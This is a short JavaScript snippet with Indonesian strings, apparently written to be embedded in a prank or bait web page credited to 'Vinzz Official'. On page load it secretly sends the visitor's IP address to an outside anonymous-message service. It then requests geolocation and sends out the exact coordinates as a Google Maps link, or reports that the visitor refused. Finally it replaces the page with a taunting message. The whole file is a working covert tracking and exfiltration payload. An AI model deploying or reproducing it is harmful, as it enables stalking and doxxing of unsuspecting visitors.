async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "Tidak diketahui";
    }
  }

  async function kirimPesan(pesan) {
    const encoded = encodeURIComponent(pesan);
    const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encoded}&type=anonymous&count=1`;
    try {
      await fetch(nglUrl);
    } catch (e) {
      console.error("Gagal mendapatkan panel.", e);
    }
  }

  // Kirim IP saat halaman dibuka
  (async () => {
    const ip = await getIP();
    await kirimPesan(`IP: ${ip}\nMENUNGGU IZIN LOKASI`);
  })();

  // Proses izin lokasi
  navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    await kirimPesan(`IP: ${ip}\nMENGIZINKAN AKSES LOKASI\nMAP: ${gmaps}`);
    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  }, async () => {
    const ip = await getIP();
    await kirimPesan(`IP: ${ip}\nMENOLAK AKSES LOKASI`);
  });
    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
